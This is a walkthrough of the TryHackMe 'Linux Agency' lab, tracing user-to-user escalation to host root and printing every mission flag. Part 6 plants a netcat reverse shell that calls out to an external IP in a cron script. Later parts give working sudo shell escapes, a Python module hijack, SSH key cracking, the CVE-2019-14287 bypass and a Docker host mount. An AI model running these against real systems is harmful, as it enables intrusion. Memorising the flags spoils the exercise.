# Walkthrough : TryHackMe - Linux Agency
## Executive Summary (Part 1)
This report details the initial enumeration, sequential lateral movement, and privilege escalation chain executed on the target host Linux Agency (```10.48.130.73```). The assessment successfully compromised users ```agent47```, ```mission1```, ```mission2```, and ```mission3```, retrieving four mission flags across the progression chain.

## 1. Service Reconnaissance

- Target IP: ```10.48.130.73```
- Target OS: Ubuntu Linux (Kernel 4.15.0-20-generic)
Execution:
```bash
nmap -sV -sC -p- 10.48.130.73
```
- Discovered Open Ports:
  - ```22/tcp``` - OpenSSH 7.6p1 Ubuntu 4ubuntu0.3

## 2. Initial Access (agent47)
Execution Steps:
1. Established SSH connection to the target using compromised credentials:
```bash
ssh agent47@10.48.130.73
```
2. Extracted Mission 1 Flag upon session initialization.
3. Mission 1 Flag: ```mission1{174dc8f191bcbb161fe25f8a5b58d1f0}```

## 3. Lateral Movement & Flag Capture Chain
Phase 1: User ```mission1``` Access
1. Switched user context from ```agent47``` to ```mission1```:
```bash
su mission1
```
2. Navigated to the root file structure and user home directory to locate stored credentials/flags.
3. Mission 2 Flag: ```mission2{8a1b68bb11e4a35245061656b5b9fa0d}```

Phase 2: User ```mission2``` Access
1. Switched user context to ```mission2```:
```bash
su mission2
```
2. Inspected /home/mission2/flag.txt.
3. Mission 3 Flag: ```mission3{ab1e1ae5cba688340825103f70b0f976}```

Phase 3: User ```mission3``` Access
1. Switched user context to mission3:
```bash
su mission3
```
2. Inspected ```/home/mission3/flag.txt```:
- Output: ```"I am really sorry man the flag is stolen by some thief's."```

## 4. Summary of Captured Flags
| Mission   | User Context | Status     | Flag / Value                                         |
| :--       | :--          | :--        | :--                                                  |
| Mission 1 | agent47      | Captured   | mission1{174dc8f191bcbb161fe25f8a5b58d1f0}           |
| Mission 2 | mission1     | Captured   | mission2{8a1b68bb11e4a35245061656b5b9fa0d}           | 
| Mission 3 | mission2     | Captured   | mission3{ab1e1ae5cba688340825103f70b0f976}           |
| Mission 4 | mission3     | Hint Found | "Stolen by ""thief"" (Requires further enumeration)" |

--- 

## Executive Summary (Part 2)
This report documents Part 2 of the lateral movement and privilege escalation chain across host Linux Agency (```10.48.130.73```). Progression continued sequentially from user ```mission3``` through ```mission9```, resolving hidden file structures, filesystem searches, and wordlist analysis to retrieve Missions 4 through 10 flags.
## 1. Lateral Movement & Flag Progression Chain
Phase 1: User ```mission3``` $\rightarrow$ ```mission4```

1. Discovered the Mission 4 flag prepended inside ```/home/mission3/flag.txt``` using the ```nano``` editor.
2. Switched user context to ```mission4```:
```bash
su mission4
```
3. Navigated to ```/home/mission4/flag/flag.txt``` to extract the next flag.
4. Mission 4 Flag: ```mission4{264a7eeb920f80b3ee9665fafb7ff92d}```
5. Mission 5 Flag: ```mission5{bc67906710c3a376bcc7bd25978f62c0}```

Phase 2: User ```mission4``` $\rightarrow$ ```mission5``` $\rightarrow$ ```mission6```
1. Switched user context to mission5:
```bash
su mission5
```
2. Read hidden flag file ```.flag.txt``` in the home directory ```(/home/mission5/.flag.txt)```.
3. Mission 6 Flag: ```mission6{1fa67e1adc244b5c6ea711f0c9675fde}```
4. Switched user context to ```mission6```:
```bash
su mission6
```
5. Navigated to ```/home/mission6/.flag/flag.txt``` to capture the next credential payload.
6. Mission 7 Flag: ```mission7{53fd6b2bad6e85519c7403267225def5}```

Phase 3: User ```mission6``` $\rightarrow$ ```mission7``` $\rightarrow$ ```mission8```
1. Switched user context to ```mission7```:
```bash
su mission7
```
2. Extracted the flag from ```/home/mission7/flag.txt```.
3. Mission 8 Flag: ```mission8{3bee25ebda7fe7dc0a9d2f481d10577b}```

Phase 4: User ```mission8``` $\rightarrow$ ```mission9``` $\rightarrow$ ```mission10```
1. Switched user context to ```mission8```:
```bash
su mission8
```
2. Executed a system-wide file search to locate misplaced flags:
```bash
find / -name "flag*" 2>/dev/null
```
3. Located root-level flag file at ```/flag.txt``` and extracted its contents.
4. Mission 9 Flag: ```mission9{ba1069363d182e1c114bef7521c898f5}```
5. Switched user context to ```mission9```:
```bash
su mission9
```
6. Identified a custom wordlist rockyou.txt in /home/mission9/ and parsed it for flag strings:
```bash
cat rockyou.txt | grep mission10
```
7. Mission 10 Flag: ```mission10{0c9d1c7c5683a1a29b05bb67856524b6}```

## 2. Summary of Captured Flags (Part 2)
| Mission    | User Context | Source / Method                                | Flag Value                                   |
| :--        | :--          | :--                                            | :--                                          |
| Mission 4  | mission3     | Prepended file data via nano                   | mission4{264a7eeb920f80b3ee9665fafb7ff92d}   |
| Mission 5  | mission4     | Directory path /home/mission4/flag/flag.txt    | mission5{bc67906710c3a376bcc7bd25978f62c0}   | 
| Mission 6  | mission5     | Hidden file /home/mission5/.flag.txt           | mission6{1fa67e1adc244b5c6ea711f0c9675fde}   | 
| Mission 7  | mission6     | Hidden directory /home/mission6/.flag/flag.txt | mission7{53fd6b2bad6e85519c7403267225def5}   | 
| Mission 8  | mission7     | Standard file /home/mission7/flag.txt          | mission8{3bee25ebda7fe7dc0a9d2f481d10577b}   | 
| Mission 9  | mission8     | Root-level search /flag.txt                    |  mission9{ba1069363d182e1c114bef7521c898f5}  | 
| Mission 10 | mission9     | Local wordlist inspection (rockyou.txt)        |  mission10{0c9d1c7c5683a1a29b05bb67856524b6} |

## Executive Summary (Part 3)
This report details Part 3 of the targeted penetration testing engagement on host Linux Agency (```10.48.130.73```). Operations continued sequentially from user ```mission10``` through ```mission14```, focusing on nested directory traversal, environment variable analysis, permission modifications, and data decoding (Base64 and Binary) to retrieve Missions 11 through 15 flags.

## 1. Lateral Movement & Flag Progression Chain
Phase 1: User ```mission10``` $\rightarrow$ ```mission11```
1. Navigated to the home folder and discovered a deeply nested directory structure:
```bash
cd /home/mission10/folder
```
2. Executed a targeted search to locate ```flag.txt``` across nested folders (```L4D8/L3D7/L2D2/L1D10```):
```bash
find . -name "flag.txt" 2>/dev/null
```
3. Read the flag content:
```bash
cat ./L4D8/L3D7/L2D2/L1D10/flag.txt
```
4. Mission 11 Flag: ```mission11{db074d9b68f06246944b991d433180c0}```

Phase 2: User ```mission11``` $\rightarrow$ ```mission12```
1. Authenticated as user ```mission11```:
```bash
su mission11
```
2. Inspected environment variables following an initial permission failure on ```/flag.txt```:
```bash
env
```
3. Extracted the flag embedded directly within the active environment variables (```FLAG / flag key```):
4. Mission 12 Flag: ```mission12{f449a1d33d6edc327354635967f9a720}```

Phase 3: User ```mission12``` $\rightarrow$ ```mission13```
1. Authenticated as user ```mission12```:
```bash
su mission12
```
2. Inspected ```/home/mission12/flag.txt```, noting zero-read permissions (```---------```).
3. Overrode file permissions to make it readable:
```bash
chmod 777 flag.txt
cat flag.txt
```
4. Mission 13 Flag: ```mission13{076124e360406b4c98ecefddd13ddb1f}```

Phase 4: User ```mission13``` $\rightarrow$ ```mission14```
1. Authenticated as user ```mission13```:
```bash
su mission13
```
2. Read the Base64-encoded string stored inside ```/home/mission13/flag.txt```:
```bash
bW1zc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQ2fQ==
```
3. Decoded the payload via local terminal pipeline:
```bash
echo 'bW1zc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQ2fQ==' | base64 --decode
```
4. Mission 14 Flag: ```mission14{d598de95639514b9941507617b9e54d2}```

Phase 5: User ```mission14``` $\rightarrow$ ```mission15```
1. Authenticated as user ```mission14```:
```bash
su mission14
```
2. Extracted binary string data from ```/home/mission14/flag.txt```.
3. Processed the raw binary string using CyberChef's ```From Binary``` (8-bit byte length, no delimiter) recipe.
4. Mission 15 Flag: ```mission15{fc4915d818bfaeff01185c3547f25596}```

## 2. Summary of Captured Flags (Part 3)

| Mission    | User Context | Vulnerability / Extraction Method                     | Flag Value                                  | 
| :--        | :--          | :--                                                   | :--                                         |
| Mission 11 | mission10    | Nested Directory Search (find)                        | mission11{db074d9b68f06246944b991d433180c0} | 
| Mission 12 | mission11    | Environment Variable Exposure (env)                   | mission12{f449a1d33d6edc327354635967f9a720} | 
| Mission 13 | mission12    | Insecure File Ownership / Permission Override (chmod) | mission13{076124e360406b4c98ecefddd13ddb1f} | 
| Mission 14 | mission13    | Base64 Encoding Obfuscation (base64 --decode)         | mission14{d598de95639514b9941507617b9e54d2} | 
| Mission 15 | mission14    | Binary Encoding Obfuscation (CyberChef From Binary)   | mission15{fc4915d818bfaeff01185c3547f25596} |

## Executive Summary (Part 4)
This report documents Part 4 of the penetration testing engagement on Linux Agency. Operations progressed sequentially from user ```mission15``` through ```mission21```, focusing on Hex decoding, binary executable execution, code compilation, and interpreter runtime execution to extract flags for Missions 16 through 21.

## 1. Lateral Movement & Flag Progression Chain
Phase 1: User ```mission15``` $\rightarrow$ ```mission16```
1. Authenticated as ```mission15``` and read the hex-encoded string inside ```/home/mission15/flag.txt```:
```bash
6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D
```
2. Decoded the payload via CyberChef using the ```From Hex``` operation (```Delimiter: None```).
3. Mission 16 Flag: ```mission16{884417d40033c4c2091b44d7c26a908e}```

Phase 2: User ```mission16``` $\rightarrow$ ```mission17```

1. Authenticated as ```mission16``` and inspected file types in ```/home/mission16```:
```bash
file flag
```
2. Confirmed ```flag``` was a 64-bit ELF shared object executable. Granted execution permissions and executed the binary:
```bash
chmod +x flag
./flag
```
3. Mission 17 Flag: ```mission17{49f8d1348a1053e221dfe7ff99f5cbf4}```

Phase 3: User ```mission17``` $\rightarrow$ ```mission18```
1. Authenticated as ```mission17``` and listed contents of ```/home/mission17```.
2. Found ```flag.java``` source file, compiled it using Java compiler, and executed the class:
```bash
javac flag.java
java flag
```
3. Mission 18 Flag: ```mission18{f09760649986b489cda320ab5f7917e8}```

Phase 4: User ```mission18``` $\rightarrow$ ```mission19```

1. Authenticated as ```mission18``` and identified ```flag.rb``` (Ruby script).
2. Modified permissions and executed the script using the Ruby interpreter:
```bash
chmod 777 flag.rb
ruby flag.rb
```
3. Mission 19 Flag: ```mission19{a0bf41f56b3ac622d808f7a4385254b7}```

Phase 5: User ```mission19``` $\rightarrow$ ```mission20```
1. Authenticated as ```mission19``` and identified ```flag.c``` (C source file).
2. Adjusted permissions, compiled using GCC, and executed the binary:
```bash
chmod 777 flag.c
gcc flag.c -o flag
./flag
```
3. Mission 20 Flag: ```mission20{b0482f9e90c8ad2421bf4353cd8eae1c}```

Phase 6: User ```mission20``` $\rightarrow$ ```mission21```
1. Authenticated as ```mission20``` and identified ```flag.py``` (Python script).
2. Adjusted permissions and ran the script with Python 3:
```bash
chmod 777 flag.py
python3 flag.py
```
3. Mission 21 Flag: ```mission21{7de756aabc528b446f6eb38419318f0c}```

## 2. Summary of Captured Flags (Part 4)

| Mission    | User Context | Extraction / Execution Method                      | Flag Value                                  | 
| :--        | :--          | :--                                                | :--                                         |
| Mission 16 | mission15    | Hex Payload Decoding (From Hex)                    | mission16{884417d40033c4c2091b44d7c26a908e} | 
| Mission 17 | mission16    | ELF Executable Permission & Run (./flag)           | mission17{49f8d1348a1053e221dfe7ff99f5cbf4} | 
| Mission 18 | mission17    | Java Source Compilation & Execution (javac / java) | mission18{f09760649986b489cda320ab5f7917e8} | 
| Mission 19 | mission18    | Ruby Script Execution (ruby flag.rb)               | mission19{a0bf41f56b3ac622d808f7a4385254b7} | 
| Mission 20 | mission19    | C Source Compilation & Binary Run (gcc / ./flag)   | mission20{b0482f9e90c8ad2421bf4353cd8eae1c} | 
| Mission 21 | mission20    | Python 3 Script Execution (python3 flag.py)        | mission21{7de756aabc528b446f6eb38419318f0c} | 

## Executive Summary
This report documents Part 5 of the penetration testing engagement on Linux Agency. Operations progressed from user ```mission21``` through ```mission28```, employing environment variable manipulation, local HTTP service enumeration, binary library trace (```ltrace```) analysis, wildcards/globbing parameter expansion, file metadata analysis, and string reversal to retrieve flags for Missions 22 through 29.

## 1. Lateral Movement & Flag Progression Chain
Phase 1: User ```mission21``` $\rightarrow$ ```mission22```
1. Authenticated as ```mission21``` and inspected environment variables:
```bash
echo $SHELL
```
2. Spawned a full Bash session to properly interact with user sessions:
```bash
bash
```
3. Extracted the SSH password for ```mission22``` from the environment configuration.
4. Mission 22 Flag: ```mission22{24caa74eb0889ed6a2e6984b42d49aaf}```

Phase 2: User ```mission22``` $\rightarrow$ ```mission23```
1. Authenticated as ```mission22``` via ```su mission22```, spawned a PTY shell using Python, and navigated to ```/home/mission22```:
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
cd ~
ls -la
```
2. Read ```flag.txt``` located in the home directory:
```bash
cat flag.txt
```
3. Mission 23 Flag: ```mission23{3710b9cb185282e3f61d2fd8b1b4ffea}```

Phase 3: User ```mission23``` $\rightarrow$ ```mission24```
1. Authenticated as ```mission23``` and read ```message.txt```:
```bash
cat message.txt
# Prompted: "The hosts will help you."
```
2. Inspected ```/etc/hosts``` and discovered a local vhost entry pointing to ```mission24.com```:
```bash
cat /etc/hosts
# 127.0.0.1 localhost linuxagency mission24.com
```
3. Executed an HTTP request to the local domain using ```curl```:
```bash
curl http://mission24.com | grep mission24
```
4. Mission 24 Flag: ```mission24{dbaeb06591a7fd6230407df3a947b89c}```

Phase 4: User ```mission24``` $\rightarrow$ ```mission25```
1. Authenticated as ```mission24``` and identified a local ELF binary named ```bribe```.
2. Traced library function calls using ```ltrace``` to analyze environmental conditions:
```bash
ltrace ./bribe
# Binary calls getenv("pocket") and compares it against "money" using strncmp()
```
3. Exported the required variable pocket with value money and executed the binary:
```bash
export pocket=money
./bribe
```
4. Mission 25 Flag: ```mission25{61b93637881c87c71f220033b22a921b}```

Phase 5: User ```mission25``` $\rightarrow$ ```mission26```
1. Authenticated as ```mission25```. Traditional commands such as ```ls``` were restricted or unavailable in the home directory context.
2. Executed a shell parameter expansion to output file contents matching hidden paths without standard ```ls/cat``` utility reliance:
```bash
printf %s $(<*)
```
3. Mission 26 Flag: ```mission26{cb6ce977c16c57f509e9f8462a120f00}```

Phase 6: User ```mission26``` $\rightarrow$ ```mission27```
1. Authenticated as ```mission26``` and listed directory contents containing ```flag.jpg```.
2. Inspected file metadata using the ```file``` command:
```bash
file flag.jpg
```
3. Retrieved the flag embedded directly inside the JPEG header EXIF comment field.
4. Mission 27 Flag: ```mission27{444d29b932124a48e7dddc0595788f4d}```

Phase 7: User ```mission27``` $\rightarrow$ ```mission28```
1. Authenticated as ```mission27``` and located an archive file with multiple chained extensions (```flag.mp3.mp4.exe...gz```).
2. Decompressed the .gz layer using gunzip and inspected printable characters via ```strings```:
```bash
gunzip flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
strings flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
```
3. Mission 28 Flag: ```mission28{03556f8ca983ef4dc26d2055aef9770f}```

Phase 8: User ```mission28``` $\rightarrow$ ```mission29```
1. Authenticated as ```mission28``` and listed files in ```/home/mission28```.
2. Located ```txt.galf``` and read its content:
```bash
cat txt.galf
# Output: }1fff2ad47eb52e68523621b8d50b2918{92noissim
```
3. Reversed the character string to construct the full flag:
```bash
echo "}1fff2ad47eb52e68523621b8d50b2918{92noissim" | rev
```
4. Mission 29 Flag: ```mission29{8192b05d8b12632586e25be74da2fff1}```

## 2. Summary of Captured Flags (Part 5)

| Mission      | User Context   | Extraction / Privilege Escalation Method                   | Flag Value                                   |
|:--           |:--             |:--                                                         |:--                                           |
| Mission 22   | mission21      | Interactive Shell Spawn & Env Extraction                   | mission22{24caa74eb0889ed6a2e6984b42d49aaf}  |
| Mission 23   | mission22      | Python PTY Spawn & Direct File Read (cat flag.txt)         | mission23{3710b9cb185282e3f61d2fd8b1b4ffea}  |
| Mission 24   | mission23      | Host file discovery & Local Vhost HTTP Query (curl)        | mission24{dbaeb06591a7fd6230407df3a947b89c}  |
| Mission 25   | mission24      | Binary Reverse Engineering (ltrace) & export pocket=money  | mission25{61b93637881c87c71f220033b22a921b}  |
| Mission 26   | mission25      | Wildcard Expansion (printf %s $(<*))                       | mission26{cb6ce977c16c57f509e9f8462a120f00}  |
| Mission 27   | mission26      | Image Comment Metadata Extraction (file flag.jpg)          | mission27{444d29b932124a48e7dddc0595788f4d}  |
| Mission 28   | mission27      | Gzip Extraction & String Parsing (gunzip / strings)        | mission28{03556f8ca983ef4dc26d2055aef9770f}  |
| Mission 29   | mission28      | File Reading & String Reversal (cat txt.galf | rev)        | mission29{8192b05d8b12632586e25be74da2fff1}  |

## Executive Summary (Part 6)
This report documents Part 6 of the penetration testing engagement on Linux Agency. Operations progressed from user ```mission28``` through ```jordan``` (user ```reza```), employing string reversal, pattern searching in web configurations, Git repository commit history inspection, crontab manipulation, Sudo GTFOBins exploitation (```zip```, ```git```), and Python module hijacking to retrieve flags for Missions 29 through 34.

## 1. Lateral Movement & Flag Progression Chain
Phase 1: User ```mission28``` $\rightarrow$ ```mission29```
1. Authenticated as ```mission28``` and listed files in ```/home/mission28```.
2. Located ```txt.galf``` and read its content:
```bash
cat txt.galf
# Output: }1fff2ad47eb52e68523621b8d50b2918{92noissim
```
3. Reversed the character string to construct the full flag:
```bash
cat txt.galf | rev
```
4. Mission 29 Flag: ```mission29{8192b05d8b12632586e25be74da2fff1}```

Phase 2: User ```mission29``` $\rightarrow$ ```mission30```
1. Authenticated as ```mission29``` and navigated to the ```bludit``` web application directory (```/home/mission29/bludit```).
2. Executed a recursive string search across hidden files for flag patterns:
```bash
cat .* | grep mission30
```
3. Located the flag embedded within the ```.htaccess``` server configuration file.
4. Mission 30 Flag: ```mission30{d25b4c9fac38411d2fcb4796171bda6e}```

Phase 3: User ```mission30``` $\rightarrow$ ```viktor```
1. Authenticated as ```mission30``` and navigated to ```/home/mission30/Escalator```.
2. Discovered a ```.git``` version control repository and inspected commit history:
```bash
cd Escalator/.git
git log
```
3. Recovered an earlier commit message containing credentials for user ```viktor```.
4. Viktor Flag / Credential: ```viktor{b52c60124c0f8f85fe647021122b3d9a}```

Phase 4: User ```viktor``` $\rightarrow$ ```dalia```
1. Authenticated as ```viktor``` via su ```viktor``` and checked crontab schedules:
```bash
cat /etc/crontab
```
2. Identified a cron job running as ```dalia``` that regularly executes ```/opt/scripts/47.sh```.
3. Appended a Netcat reverse shell payload to ```/opt/scripts/47.sh```:
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.135.130 1234 >/tmp/f" >> /opt/scripts/47.sh
```
4. Set up a listener on Kali (```nc -lvnp 1234```) to catch the incoming connection from ```dalia``` and read ```flag.txt```.
5. Dalia Flag: ```dalia{4a94a7a7bb4a819a63a33979926c77dc}```

Phase 5: User ```dalia``` $\rightarrow$ ```silvio```
1. Authenticated as ```dalia``` and checked Sudo privileges:
```bash
sudo -l
# Matching entry: (silvio) NOPASSWD: /usr/bin/zip
```
2. Exploited the Sudo ```zip``` GTFOBin privilege escalation vector to run a subshell as ```silvio```:
```bash
TF=$(mktemp -u)
sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
```
3. Navigated to ```/home/silvio``` and retrieved ```flag.txt```:
```bash
cat flag.txt
```
4. Silvio Flag: ```silvio{657b4d058c03ab9988875bc937f9c2ef}```

Phase 6: User ```silvio``` $\rightarrow$ ```reza```
1. Authenticated as ```silvio``` and checked Sudo privileges:
```bash
sudo -l
# Matching entry: (reza) SETENV: NOPASSWD: /usr/bin/git
```
2. Exploited ```git``` pager execution via Sudo to break out into a shell as ```reza```:
```bash
sudo -u reza PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
```
3. Navigated to ```/home/reza``` and read ```flag.txt```:
```bash
cat flag.txt
```
4. Reza Flag: ```reza{2f1901644eda75306f3142d837b80d3e}```

Phase 7: User ```reza``` $\rightarrow$ ```jordan```
1. Authenticated as ```reza``` and checked Sudo privileges:
```bash
sudo -l
# Matching entry: (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
```
2. Analyzed ```/opt/scripts/Gun-Shop.py``` and identified a Python module hijack vulnerability (importing a module from the current working directory).
3. Prepared a malicious local Python script inside /tmp/shop to hijack execution when invoking Sudo with ```PYTHONPATH``` or directory execution context.

## 2. Summary of Captured Flags (Part 6)

| User / Context  | Privilege Escalation Vector                       | Flag / Credential Value                     |
|:--              |:--                                                |:--                                          |
| Mission 29      | Direct File Reading & String Reversal (rev)       | mission29{8192b05d8b12632586e25be74da2fff1} |
| Mission 30      | Hidden Web Config Parsing (.htaccess)             | mission30{d25b4c9fac38411d2fcb4796171bda6e} |
| Viktor          | Git Repository Commit History Analysis (git log)  | viktor{b52c60124c0f8f85fe647021122b3d9a}    |
| Dalia           | Crontab Shell Script Hijack (/opt/scripts/47.sh)  | dalia{4a94a7a7bb4a819a63a33979926c77dc}     |
| Silvio          | Sudo GTFOBins Execution (sudo -u silvio zip)      | silvio{657b4d058c03ab9988875bc937f9c2ef}    |
| Reza            | Sudo GTFOBins Pager Execution (sudo -u reza git)  | reza{2f1901644eda75306f3142d837b80d3e}      | 

## Executive Summary (Part 7)
This report documents Part 7 of the penetration testing assessment for Linux Agency. Operations progressed from user ```reza``` through ```maya``` by exploiting local Python library hijacking (```PYTHONPATH```), Sudo binary abuses (```less, vim```), SUID binary inspection, Base64 decoding from system logs, and targeted SSH key enumeration.

## 1. Privilege Escalation & Lateral Movement Path
Phase 1: User ```reza``` $\rightarrow$ ```jordan```
1. Module Hijacking: Created a malicious ```shop.py``` script containing a payload to invoke a root-equivalent subshell:
```bash
import os
os.system("/bin/bash")
```
2. Execution: Ran the Sudo script as ```jordan``` while specifying ```PYTHONPATH=/tmp/shop/``` to hijack python execution:
```bash
sudo -u jordan PYTHONPATH=/tmp/shop/ /opt/scripts/Gun-Shop.py
```
3. Flag Recovery: Navigated to ```/home/jordan``` and read ```flag.txt```:
```bash
cat flag.txt | rev
```
4. Jordan Flag: ```jordan{fcbc4b3c31c9b58289b3946978f9e3c3}```

Phase 2: User ```jordan``` $\rightarrow$ ```ken```
1. Sudo Enumeration: Checked Sudo permissions for ```jordan```:
```bash
sudo -l
# Matching entry: (ken) NOPASSWD: /usr/bin/less
```
2. Escalation: Exploited the ```less``` GTFOBins breakout to execute ```/bin/bash``` under ```ken```:
```bash
sudo -u ken less /etc/profile
# Inside less interface: !/bin/bash
```
3. Flag Recovery: Navigated to ```/home/ken``` and read ```flag.txt```.
4. Ken Flag: ```ken{4115bf456d1aaf012ed4550c418ba99f}```

Phase 3: User ```ken``` $\rightarrow$ ```sean```
1. Sudo Enumeration: Checked Sudo permissions for ```ken```:
```bash
sudo -l
# Matching entry: (sean) NOPASSWD: /usr/bin/vim
```
2. Escalation: Invoked ```vim``` via Sudo to break out into a subshell:
```bash
sudo -u sean vim -c ':!/bin/sh'
```
3. Flag Recovery & Log Inspection: Inspected ```/var/log/syslog.bak``` for sensitive entries belonging to ```sean```:
```bash
cat /var/log/syslog.bak | grep sean
```
4. Sean Flag: ```sean{4c5685f4db7966a43cf8e95859801281}```

Phase 4: User sean $\rightarrow$ penelope
1. Credential Recovery: Discovered an encoded Base64 string appended inside ```/var/log/syslog.bak```:
```bash
echo 'VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHA3bmVsb3BlCg==' | base64 --decode
# Decoded Output: The password of penelope is p3nelope
```
2. Authentication: Authenticated as ```penelope``` using ```su penelope```.
3. Flag Recovery: Read ```flag.txt``` inside ```/home/penelope```.
4. Penelope Flag: ```penelope{2da1c2e9d2bd0004556ae9e107c1d222}```

Phase 5: User penelope $\rightarrow$ maya
1. SUID Binary Inspection: Identified a custom SUID binary named ```base64``` located in ```/home/penelope``` owned by ```maya```.
2. Privilege Exploitation: Used the custom SUID binary to read ```/home/maya/flag.txt``` and piping through base64 decoding:
```bash
./base64 "/home/maya/flag.txt" | base64 --decode
```
3. Maya Flag: ```maya{a66e159374b98f64f89f7c8d458ebb2b}```
4. Artifact Discovery: Switching context to maya via credentials, enumerated ```/home/maya/old_robert_ssh``` and located an encrypted RSA Private Key (```id_rsa```).

## 2. Part 7 Captured Flags Summary

| Target User  | Primary Escalation Vector                        | Flag Value                                 |
|:--           |:--                                               |:--                                         |
| jordan       | Python Module Hijacking (PYTHONPATH=/tmp/shop/)  | jordan{fcbc4b3c31c9b58289b3946978f9e3c3}   | 
| ken          | Sudo GTFOBins (less Shell Escape)                | ken{4115bf456d1aaf012ed4550c418ba99f}      | 
| sean         | Sudo GTFOBins (vim Shell Escape)                 | sean{4c5685f4db7966a43cf8e95859801281}     | 
| penelope     | Decoded Base64 Log Leak (p3nelope)               | penelope{2da1c2e9d2bd0004556ae9e107c1d222} |
| maya         | Custom SUID Binary Abuse (./base64)              | maya{a66e159374b98f64f89f7c8d458ebb2b}     |

## Executive Summary (Part 8)
This final report details Part 8 of the Linux Agency penetration testing engagement. Operations progressed from obtaining encrypted SSH credentials for ```robert```, exploiting a containerized environment via SSH forwarding and Sudo security bypasses, and leveraging Docker host filesystem mounting to achieve full host system compromise and retrieve the final root flag.

## 1. Execution Path & Exploitation Details
Phase 1: SSH Private Key Cracking & Forwarding (```robert```)
1. Passphrase Cracking: Extracted the SSH private key from ```/home/maya/old_robert_ssh/id_rsa``` and converted it to a crackable hash format:
```bash
/usr/share/john/ssh2john.py id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
- Recovered Passphrase: ```industryweapon```

2. Port Discovery: Evaluated open listening ports using ```ss -lutpw``` and identified an internal SSH service bound to ```127.0.0.1:2222```.
3. SSH Access: Authenticated as user ```robert``` on port 2222:
```bash
ssh robert@127.0.0.1 -p 2222
```
Phase 2: Sudo Vulnerability Exploitation (CVE-2019-14287)
1. Privilege Enumeration: Checked Sudo configuration for ```robert```:
```bash
sudo -l
# Entry: (ALL, !root) NOPASSWD: /bin/bash
```
2. Exploitation: Leveraged the Sudo user ID specification vulnerability (CVE-2019-14287) by passing ID ```-1``` (or ```4294967295```) to bypass explicit root restrictions and spawn a root shell:
```bash
sudo -u#-1 /bin/bash
```
3. Container Root Flag Recovery: Navigated to ```/root``` and read ```user.txt```:
- User Flag: ```user{620fb94d32470e1e9dcf8926481efc96}```
- Message File (```success.txt```): Directed the operator to breach the outer container environment back to the main host.

Phase 3: Docker Host Escape to Full System Root
1. Container Enumeration: Checked ```/tmp``` for binaries and identified a standalone ```./docker``` binary socket client.
2. Container Inspection: Listed active Docker containers:
```bash
./docker ps -a
```
3. Host Filesystem Mount: Ran a privileged Docker container mapping the root directory of the host host system (```/```) to ```/mnt``` inside a new container instance:
```bash
./docker run -v /:/mnt --rm -it mangoman chroot /mnt sh
```
4. Root Flag Recovery: Spawned ```bash```, navigated to ```/root```, and read ```root.txt```.

## 2. Part 8 Summary of Findings & Flags

| Target / Context  | Vector / Vulnerability                              | Flag / Credential Value                |
| :--               | :--                                                 | :--                                    |
| Robert SSH        | Key Passphrase Crack (john / rockyou.txt)           | industryweapon                         |
| Container Root    | Sudo User ID Specification Bypass (CVE-2019-14287)  | user{620fb94d32470e1e9dcf8926481efc96} |
| Host Root System  | Docker Socket Abuse & Host Root Mount (-v /:/mnt)   | root{62ca2110ce7df377872dd9f0797f8476} |
